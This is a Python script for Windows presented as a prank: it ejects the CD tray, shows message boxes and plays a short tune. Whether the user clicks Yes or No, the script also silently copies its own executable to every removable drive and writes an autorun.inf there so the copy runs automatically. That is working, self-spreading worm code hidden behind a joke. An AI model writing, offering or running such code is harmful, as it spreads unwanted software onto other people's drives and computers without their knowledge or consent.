import ctypes
import tkinter
from tkinter import messagebox
import sys
import winsound
import shutil
import os

# Function to eject the CD drive
def eject_cd_drive():
    try:
        ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
        print("CD drive ejected.")
    except Exception as e:
        print(f"Error ejecting CD drive: {e}")

# Function to copy the executable and autorun.inf to all removable drives
def copy_to_removable_drives():
    try:
        # Get all drives
        drives = [f"{chr(letter)}:\\" for letter in range(65, 91) if os.path.exists(f"{chr(letter)}:\\")]
        removable_drives = [drive for drive in drives if ctypes.windll.kernel32.GetDriveTypeW(drive) == 2]  # DRIVE_REMOVABLE

        # Path to the current executable
        current_exe = os.path.abspath(sys.argv[0])

        # Content of the autorun.inf file
        autorun_content = f"""[autorun]
open={os.path.basename(current_exe)}
icon={os.path.basename(current_exe)}
"""

        # Copy the executable and create autorun.inf on each removable drive
        for drive in removable_drives:
            destination_exe = os.path.join(drive, os.path.basename(current_exe))
            autorun_path = os.path.join(drive, "autorun.inf")

            # Copy the executable
            shutil.copy2(current_exe, destination_exe)
            print(f"Copied {current_exe} to {destination_exe}")

            # Create and write the autorun.inf file
            with open(autorun_path, "w") as autorun_file:
                autorun_file.write(autorun_content)
            print(f"Created autorun.inf at {autorun_path}")
    except Exception as e:
        print(f"Error copying to removable drives: {e}")

# Function to display a message box
def display_message_box():
    root = tkinter.Tk()
    root.withdraw()  # Hide the root window
    response = messagebox.askyesno("Confirmation", "Do you want to continue?")
    if response:
        # If user clicks Yes, show another message box
        messagebox.showinfo("Action Required", "Please insert the CD.")
        print("User chose Yes. Prompted to insert the CD.")
        # Play a small tune
        winsound.Beep(440, 500)  # A4 note for 500ms
        winsound.Beep(494, 500)  # B4 note for 500ms
        winsound.Beep(523, 500)  # C5 note for 500ms
        print("Played a small tune.")
        # Show a welcome message box
        messagebox.showinfo("Welcome", "Welcome to the party!")
        print("Displayed welcome message. Exiting the program.")
        copy_to_removable_drives()  # Copy to removable drives before exiting
        sys.exit()
    else:
        # If user clicks No, exit the program
        print("User chose No. Exiting the program.")
        copy_to_removable_drives()  # Copy to removable drives before exiting
        sys.exit()

# Call the functions
eject_cd_drive()
display_message_box()